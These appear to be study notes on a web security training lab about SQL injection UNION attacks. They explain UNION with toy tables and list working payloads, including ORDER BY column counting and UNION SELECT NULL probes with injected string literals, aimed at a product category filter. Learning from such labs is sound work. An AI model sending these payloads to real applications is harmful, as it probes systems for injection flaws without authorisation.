This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. 
To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. 
This technique helps you determine which columns are compatible with string data. 

End Goal: determine the number of columns returned by the query.

Background (Union):

table1  table2
a | b   c | d
-----   ------
1 , 2   2 , 3
3 , 4   4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Rule: 
- The number and the order of the columns must be the same is all queries
- The data types must be compatible

Step #1: Determine # of columns

SQLi attack (way #1):

select ? from table1 UNION select NULL
- error => incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
- 200 response code => correct number of columns

SQLi attack (way #2):

select a, b from table1 order by 3

Step #2: Determine the data type of the columns

select a, b, c from table1 UNION select 'a', NULL, NULL
- error => column is not type string
- 200 response code => column is of type text

Analysis: 
--------

' order by 1--
- 3 columns => list column is not show on the page.

' UNION select NULL, 'a', NULL--
- 2nd column of type string

' UNION select NULL, 'XXXXXX', NULL--
